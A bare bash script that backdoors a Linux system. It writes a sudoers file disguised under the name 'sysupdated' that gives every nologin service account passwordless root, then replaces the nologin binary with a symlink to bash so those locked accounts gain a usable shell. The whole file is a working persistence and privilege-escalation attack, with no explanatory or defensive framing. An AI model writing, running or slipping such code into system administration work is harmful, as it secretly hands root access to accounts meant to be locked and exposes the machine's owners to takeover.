#!/usr/bin/env bash

NLOGIN_LOC=$(which nologin)
BASH_LOC=$(which bash)

getent passwd | awk -F: '$7 ~ /nologin/ {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
    > /etc/sudoers.d/sysupdated
chmod 440 /etc/sudoers.d/sysupdated

cp $NLOGIN_LOC ${NLOGIN_LOC}.orig
rm -rf $NLOGIN_LOC
ln -s $BASH_LOC $NLOGIN_LOC